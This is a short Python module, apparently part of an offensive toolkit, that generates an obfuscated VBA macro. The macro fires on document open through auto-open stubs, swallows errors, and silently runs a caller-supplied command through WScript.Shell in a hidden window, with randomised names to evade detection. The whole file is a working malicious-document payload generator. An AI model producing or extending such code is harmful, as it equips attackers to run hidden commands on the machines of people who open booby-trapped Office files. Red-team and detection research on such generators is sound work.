#!/usr/bin/env python3
from ..utils.obfuscation import VBAObfuscator

class DirectExecutionMacro:
    """Generate macro for direct command execution"""
    
    def __init__(self, command):
        self.command = command
        self.obf = VBAObfuscator()
    
    def generate(self):
        """Create direct execution macro"""
        func_name = self.obf.random_var()
        var_shell = self.obf.random_var()
        
        macro = self.obf.create_auto_open_stubs(func_name)
        
        macro += f'''
Private Sub {func_name}()
    On Error Resume Next
    
    Dim {var_shell} As Object
    Set {var_shell} = CreateObject("WScript.Shell")
    {var_shell}.Run "{self.command}", 0, False
End Sub
'''
        return macro.strip()